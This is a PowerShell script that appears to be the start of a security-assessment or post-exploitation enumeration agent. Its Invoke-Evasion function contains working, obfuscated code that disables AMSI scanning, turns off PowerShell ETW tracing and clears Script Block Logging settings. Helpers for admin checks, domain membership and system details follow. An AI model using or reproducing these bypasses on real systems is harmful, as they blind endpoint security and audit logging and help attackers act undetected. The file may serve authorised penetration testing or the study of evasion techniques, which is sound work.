#Requires -Version 3.0

$script:AgentVersion = "2.0.0"
$script:TotalChecks = 0
$script:CompletedChecks = 0
$script:SeepQuiet = $false

function Invoke-Evasion {
    [CmdletBinding()]
    param()

    # --- AMSI bypass (reflection, obfuscated field/type names) ---
    try {
        $u = ('A{0}siUt{1}ls' -f 'm','i')
        $t = [Ref].Assembly.GetType("System.Management.Automation.$u")
        if ($t) {
            $fn = ('a{0}si{1}nit{2}ailed' -f 'm','I','F')
            $f = $t.GetField($fn,'NonPublic,Static')
            if ($f) { [void]$f.SetValue($null,$true) }
        }
    } catch {}

    # --- ETW bypass (disable PowerShell ETW provider) ---
    try {
        $et = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        if ($et) {
            $ef = $et.GetField('etwEnabled','NonPublic,Static')
            if ($ef) { [void]$ef.SetValue($null,$false) }
        }
    } catch {}

    # --- Script Block Logging bypass (clear cached group policy) ---
    try {
        $ut = [Ref].Assembly.GetType('System.Management.Automation.Utils')
        if ($ut) {
            $gp = $ut.GetField('cachedGroupPolicySettings','NonPublic,Static')
            if ($gp) {
                $s = $gp.GetValue($null)
                if ($s) {
                    $key = ('Script{0}lock{1}ogging' -f 'B','L')
                    if ($s.ContainsKey($key)) {
                        $s[$key][('Enable{0}' -f $key)] = 0
                        $s[$key][('Enable{0}Invocation{1}ogging' -f $key,'L')] = 0
                    }
                }
            }
        }
    } catch {}
}

function Write-Status {
    [CmdletBinding()]
    param(
        [string]$Message,
        [string]$Type = "INFO"
    )

    if ($Type -eq "INFO" -and $script:SeepQuiet) { return }

    $pct = if ($script:TotalChecks -gt 0) {
        [int](($script:CompletedChecks / $script:TotalChecks) * 100)
    } else { 0 }

    $ts = Get-Date -Format "HH:mm:ss"
    $prefix = "[{0}][{1:D2}%] [*] " -f $ts, $pct

    $color = switch ($Type) {
        "SUCCESS"  { "Green" }
        "WARNING"  { "Yellow" }
        "ERROR"    { "Red" }
        "CRITICAL" { "Magenta" }
        default    { "Cyan" }
    }

    Write-Host "$prefix$Message" -ForegroundColor $color
}

function New-Finding {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$CheckId,
        [Parameter(Mandatory)][string]$FindingId,
        [Parameter(Mandatory)][string]$Severity,
        [Parameter(Mandatory)][string]$Title,
        [string]$Description = "",
        [string]$Evidence = "",
        [string]$Remediation = "",
        [string[]]$Tags = @(),
        [string[]]$ToolHint = @()
    )

    # Truncate evidence to 50KB
    if ($Evidence.Length -gt 50000) {
        $Evidence = $Evidence.Substring(0, 50000) + "[TRUNCATED]"
    }

    return @{
        check_id    = $CheckId
        finding_id  = $FindingId
        severity    = $Severity
        title       = $Title
        description = $Description
        evidence    = $Evidence
        remediation = $Remediation
        tags        = $Tags
        tool_hint   = $ToolHint
        timestamp   = Get-Date -Format "o"
    }
}

function Test-IsAdmin {
    [CmdletBinding()]
    param()
    $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-IsDomainJoined {
    [CmdletBinding()]
    param()
    try {
        $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction Stop
        return ($cs.PartOfDomain -eq $true)
    } catch {
        try {
            $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
            return ($cs.PartOfDomain -eq $true)
        } catch {
            return $false
        }
    }
}

function Get-SystemContext {
    [CmdletBinding()]
    param()

    $os = $null
    try {
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
    } catch {
        try { $os = Get-WmiObject Win32_OperatingSystem -ErrorAction Stop } catch {}
    }

    return @{
        hostname    = $env:COMPUTERNAME
        username    = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        is_admin    = Test-IsAdmin
        is_domain   = Test-IsDomainJoined
        os_version  = if ($os) { $os.Version } else { [Environment]::OSVersion.Version.ToString() }
        os_name     = if ($os) { $os.Caption } else { [Environment]::OSVersion.VersionString }
        ps_version  = $PSVersionTable.PSVersion.ToString()
        architecture = $env:PROCESSOR_ARCHITECTURE
        domain      = $env:USERDNSDOMAIN
    }
}
